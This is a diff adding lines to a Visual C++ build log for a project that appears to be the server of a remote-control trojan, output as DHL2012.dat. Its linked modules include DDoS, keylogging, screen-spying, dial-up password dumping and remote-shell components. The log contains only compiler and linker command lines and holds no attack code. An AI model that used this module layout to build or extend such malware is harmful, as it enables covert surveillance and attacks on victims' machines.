@@ -6,6 +6,54 @@
 --------------------Configuration: Server - Win32 Release--------------------
 </h3>
 <h3>Command Lines</h3>
+Creating temporary file "C:\DOCUME~1\wp\LOCALS~1\Temp\RSPA.tmp" with contents
+[
+/nologo /MT /W3 /GX /O1 /I "../common" /D "WIN32" /D "NDEBUG" /D "_MBCS" /D "_DLL" /Fo"Release/" /Fd"Release/" /FD /c 
+"E:\Program\Tem_C\0001.Ô¶¿Ø\0110.DHL_yk_DDos\Src\Server\common\DDOSManager.cpp"
+"E:\Program\Tem_C\0001.Ô¶¿Ø\0110.DHL_yk_DDos\Src\Server\common\KernelManager.cpp"
+]
+Creating command line "cl.exe @C:\DOCUME~1\wp\LOCALS~1\Temp\RSPA.tmp" 
+Creating temporary file "C:\DOCUME~1\wp\LOCALS~1\Temp\RSPB.tmp" with contents
+[
+../common/zlib/zlib.lib ../common/G729a.lib Shlwapi.lib MSVCRT.LIB /nologo /subsystem:windows /incremental:no /pdb:"Release/DHL2012.pdb" /machine:I386 /nodefaultlib:"LIBCMT" /out:"../bin/Update/DHL2012.dat" 
+".\Release\AudioCode.obj"
+".\Release\AudioManager.obj"
+".\Release\Buffer.obj"
+".\Release\ClientSocket.obj"
+".\Release\DDOSManager.obj"
+".\Release\Dialupass.obj"
+".\Release\FileManager.obj"
+".\Release\install.obj"
+".\Release\KernelManager.obj"
+".\Release\KeyboardManager.obj"
+".\Release\Manager.obj"
+".\Release\Myfunction.obj"
+".\Release\RegEditEx.obj"
+".\Release\RegeditOpt.obj"
+".\Release\Registry.obj"
+".\Release\RegManager.obj"
+".\Release\ScreenManager.obj"
+".\Release\ScreenSpy.obj"
+".\Release\SerManager.obj"
+".\Release\Server.obj"
+".\Release\ServerStart.obj"
+".\Release\ShellManager.obj"
+".\Release\StdAfx.obj"
+".\Release\SystemManager.obj"
+".\Release\until.obj"
+".\Release\VideoCap.obj"
+".\Release\VideoManager.obj"
+".\Release\WaveIn.obj"
+".\Release\WaveOut.obj"
+".\Release\Server.res"
+]
+Creating command line "link.exe @C:\DOCUME~1\wp\LOCALS~1\Temp\RSPB.tmp"
+<h3>Output Window</h3>
+Compiling...
+DDOSManager.cpp
+KernelManager.cpp
+Generating Code...
+Linking...
 
 
 
